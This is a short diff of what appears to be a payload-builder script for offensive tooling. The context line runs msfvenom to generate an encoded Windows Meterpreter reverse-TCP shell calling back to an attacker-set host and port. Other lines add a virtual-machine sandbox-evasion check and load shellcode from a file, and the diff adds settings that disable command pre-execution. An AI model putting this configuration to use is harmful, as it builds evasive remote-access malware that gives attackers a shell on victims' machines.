@@ -25,6 +25,10 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shi
 # add fopen sandbox evasion
 add_evasion has_vm_mac
 
+# no command preexec
+set_command_source none
+set_command_exec none
+
 # set shellcode source
 set_payload_source static_from_file input/sc_c.txt
 
